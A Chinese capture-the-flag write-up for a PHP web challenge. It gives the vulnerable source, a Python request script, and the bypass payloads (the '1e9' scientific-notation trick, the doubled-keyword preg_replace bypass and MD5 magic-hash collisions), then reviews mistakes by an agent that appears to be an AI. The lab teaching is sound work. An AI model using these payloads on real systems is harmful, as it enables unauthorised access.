## 源码分析

### 完整源码

```php
<?php
session_start();
highlight_file(__FILE__);
if(isset($_GET['num'])){
    if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
        echo ":D";
        $_SESSION['L1'] = 1;
    }else{ echo ":C"; }
}
if(isset($_GET['str'])){
    $str = preg_replace('/NSSCTF/',"",$_GET['str']);
    if($str === "NSSCTF"){
        echo "wow";
        $_SESSION['L2'] = 1;
    }else{ echo $str; }
}
if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
    if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
        echo "Nice!";
        if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
            if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
                echo "yoxi!";
                $_SESSION['L3'] = 1;
            }else{ echo "X("; }
        }
    }else{ echo "G"; }
}
if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
    include('flag.php');
    echo $flag;
}
?>
```

### 三关卡分析

| 关卡 | 参数 | 条件 | 绕过方法 | 成功标记 |
|------|------|------|----------|----------|
| L1 | `num` (GET) | `strlen(num)<=3 && num>999999999` | 科学计数法 `1e9` | `:D` |

| Flag | — | `L1 && L2 && L3` 全部 session 就位 | — | `NSSCTF{...}` |

## 正确 Payload 及原理

### 完整请求

```python
import requests
s = requests.Session()

# Step 1: 设置 L1 + L2 session
r1 = s.get("http://target/?num=1e9&str=NSSNSSCTFCTF")
# r1.text 包含 ":Dwow"

# Step 2: 触发 L3 + 获取 flag
r2 = s.post("http://target/", data={"md5_1": "QNKCDZO", "md5_2": "s878926199a"})
# r2.text 包含 "Nice!yoxi!" + flag
```

### L1: 科学计数法绕过

```
GET ?num=1e9
```

- `strlen("1e9")` = 3（字符串长度）≤ 3 ✅
- `"1e9" > 999999999` → PHP 将 `"1e9"` 转换为 `1000000000` > `999999999` ✅

### L2: preg_replace 双写绕过

```
GET ?str=NSSNSSCTFCTF
```

- `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → 删除中间 `NSSCTF` → `NSS` + `CTF` = `NSSCTF`
- `'NSSCTF' === 'NSSCTF'` ✅

### L3: MD5 弱比较碰撞

```
POST md5_1=QNKCDZO&md5_2=s878926199a
```

- `md5("QNKCDZO")` = `0e830400451993494058024219903391`
- `md5("s878926199a")` = `0e545993274517709034328855841020`
- PHP 弱比较 `"0e830400..." == "0e545993..."` → 都被当作科学计数法 `0` → `0 == 0` = `true` ✅
- `"QNKCDZO" !== "s878926199a"` ✅
- `is_string("QNKCDZO") && is_string("s878926199a")` ✅

### ⚠️ L3 的关键陷阱：0e 后必须全是数字

- ❌ `100523` → md5 = `0e993dffb88165eb32369e16dd25b536` → 含字母 `d`/`f` → PHP 不当作科学计数法 → **弱比较失败**
- ✅ `QNKCDZO` → md5 = `0e830400451993494058024219903391` → `0e` 后全是数字 → PHP 当作科学计数法 0 → **弱比较成功**

### 具体问题清单

#### 1. MD5 弱比较知识不精确（最大浪费源）

GHIA Scout 知道"0e 开头的 md5 弱比较相等"，但不知道 **`0e` 后必须全是数字（0-9）** 才能被 PHP 当作科学计数法。

- 用了 `100523`（md5 = `0e993d...`，含字母 d/f）→ PHP 不当作科学计数法 → 弱比较失败
- 浪费 5+ 轮在错误碰撞值上

**应改进**：php-bypass-cheatsheet.md 和 WAF_BYPASS_KNOWLEDGE 中明确指出 `0e` 后必须全是数字

#### 2. 碰撞值搜索策略低效

搜索路径混乱：
1. 先搜 "双重 MD5 碰撞"（理解条件为 `md5(md5(x))==md5(md5(y))`）→ 条件理解错误
2. 暴力搜索随机数字 → 找到的 md5 值含字母
3. web 搜索 → 超时

**正确路径**：题目条件是 `md5(x) == md5(y)`（弱比较），不是双重 MD5。应该直接用已知的经典碰撞字符串 `QNKCDZO`/`240610708`/`s878926199a` 等。

**应改进**：ctf-web SKILL.md 中添加"MD5 弱比较标准碰撞字符串表"（含验证通过的值）

#### 3. Session 管理意识薄弱

- 题目用 `$_SESSION` 存 L1/L2/L3 状态 → 必须保持 cookie
- GHIA Scout 尝试用同一次请求发送所有参数 → 有时成功有时失败
- 大量轮数浪费在 "为什么 flag 没出现" 的调试上

**应改进**：代码审计遇到 `$_SESSION` 时，自动提醒需要 session 管理（cookie 持久化）

#### 4. 重复验证过度

获取 flag 后又发了 9 轮重复请求。虽然验证是好习惯，但验证 1-2 次即可。

**应改进**：flag 验证成功后最多再验证 1 次，然后立即 [DONE]

## 经验总结

### 核心方法论

1. **科学计数法是 PHP 弱比较绕过的万能钥匙** — `1e9`/`9e9` 等格式同时满足字符串短和数值大
2. **preg_replace 双写绕过** — `关键词前半 + 关键词 + 关键词后半`，替换后拼出原词
3. **MD5 弱比较** — `0e` 开头且后跟纯数字的 md5 值，PHP 当作科学计数法 0，互相比对相等
4. **⚠️ 0e 后必须全是数字** — `0e830400...`（全数字 ✅） vs `0e993d...`（含字母 ❌）
5. **Session 题目必须管理 cookie** — PHP `$_SESSION` 依赖 cookie，需分步请求
